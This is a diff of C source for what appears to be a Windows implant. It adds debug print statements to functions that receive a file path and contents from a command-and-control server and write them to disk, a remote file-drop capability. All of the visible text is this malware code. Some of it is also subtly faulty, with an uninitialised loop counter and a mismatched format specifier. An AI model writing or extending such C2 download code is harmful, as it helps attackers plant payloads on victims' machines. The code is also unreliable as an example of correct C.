@@ -9,6 +9,7 @@
 long get_file_size() {
   char* file_size_buf = recv_from_cnc(FILESIZE_BUFFSIZE);
   long file_size = *(long*)file_size_buf;
+  printf("File size: %d\n", file_size);
   free(file_size_buf);
   return file_size;
 }
@@ -25,6 +26,7 @@ unsigned long get_bufsize(unsigned long file_size, unsigned long bytes_read) {
 HANDLE open_uploaded_file() {
   HANDLE file;
   char* path = recv_from_cnc(PATH_BUFFSIZE);
+  printf("Opening: %s\n", path);
   file = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_NEW,
                      FILE_ATTRIBUTE_NORMAL, NULL);
   free(path);
@@ -34,6 +36,7 @@ HANDLE open_uploaded_file() {
 void recv_into_file(HANDLE file) {
   unsigned long bytes_read, bytes_written, to_be_read, bufsize, file_size;
   char* buf;
+  printf("Writing to file.\n");
   file_size = get_file_size();
   while (bytes_read < file_size) {
     bufsize = get_bufsize(file_size, bytes_read);
@@ -42,9 +45,11 @@ void recv_into_file(HANDLE file) {
     free(buf);
     bytes_read += bufsize;
   }
+  printf("Finished writing to file.\n");
 }
 
 void download_from_cnc() {
+  printf("Downloading file from Alakazam.\n");
   HANDLE file = open_uploaded_file();
   recv_into_file(file);
   CloseHandle(file);
